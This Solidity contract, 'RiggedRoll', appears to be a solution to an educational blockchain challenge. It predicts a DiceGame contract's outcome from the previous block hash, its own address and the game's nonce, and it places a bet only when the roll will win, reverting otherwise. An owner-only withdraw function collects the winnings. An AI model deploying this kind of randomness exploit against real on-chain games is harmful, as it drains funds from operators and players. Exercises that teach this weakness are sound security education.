// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <=0.8.15;  //Do not change the solidity version as it negativly impacts submission grading

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

     event Received(address, uint);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
      (bool response,/*byte32 data*/ ) = _addr.call{value: _amount}("");
      require(response, "Failed to send Ether");    
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public payable {
      require(address(this).balance >= 0.002 ether, "RiggedRoll doesn't have enough funds");

      bytes32 prevhash = blockhash(block.number - 1);
      bytes32 hash = keccak256(abi.encodePacked(prevhash, address(this), diceGame.nonce()));
      uint256 roll = uint256(hash) % 16;
      if(roll > 2) {
        revert();
      }
      //require(roll <= 2, "The roll is bigger than 2");
      uint256 valueToSend = .002 ether;
      diceGame.rollTheDice{value: valueToSend}();
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {
         emit Received(msg.sender, msg.value);
    }
    
}
